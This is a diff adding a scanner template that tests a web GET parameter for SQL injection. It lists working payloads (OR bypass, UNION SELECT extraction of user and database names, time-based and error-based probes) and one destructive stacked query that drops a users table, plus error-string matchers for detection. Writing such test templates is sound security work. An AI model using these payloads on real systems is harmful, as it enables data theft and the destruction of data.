@@ -1,0 +1,75 @@
+id: generic-sqli-get
+info:
+  name: SQL Injection (GET)
+  severity: critical
+  description: Generic SQL injection testing for GET parameters
+  tags:
+    - sqli
+    - injection
+    - generic
+
+generic:
+  # Endpoint variable - resolved from target config
+  endpoint: "{{sqli}}"
+
+  method: GET
+
+  # Parameter name to inject into
+  parameter: "id"
+
+  payloads:
+    - name: "single_quote"
+      value: "'"
+      description: "Basic single quote test"
+
+    - name: "or_bypass"
+      value: "' OR '1'='1"
+      description: "OR bypass technique"
+
+    - name: "union_select"
+      value: "' UNION SELECT NULL,user(),database()-- -"
+      description: "UNION SELECT for data extraction"
+
+    - name: "union_select_2"
+      value: "1' UNION SELECT 1,2,3-- -"
+      description: "UNION SELECT with numeric values"
+
+    - name: "and_boolean"
+      value: "' AND 1=1-- -"
+      description: "AND boolean-based"
+
+    - name: "time_based"
+      value: "' AND SLEEP(5)-- -"
+      description: "Time-based blind"
+
+    - name: "error_based"
+      value: "' AND 1=CONVERT(int, (SELECT @@version))-- -"
+      description: "Error-based (MSSQL)"
+
+    - name: "stacked_queries"
+      value: "'; DROP TABLE users-- -"
+      description: "Stacked queries"
+
+  matchers:
+    - type: word
+      words:
+        - "You have an error in your SQL syntax"
+        - "mysql_fetch"
+        - "Warning: mysql"
+        - "ORA-01756"
+        - "Microsoft OLE DB Provider for ODBC Drivers"
+        - "PostgreSQL query failed"
+        - "SQLite3::SQLException"
+        - "Unclosed quotation mark"
+        - "Syntax error"
+        - "invalid query"
+      condition: or
+
+    - type: word
+      words:
+        - "root"
+        - "localhost"
+        - "database()"
+        - "version()"
+        - "@@version"
+      condition: or
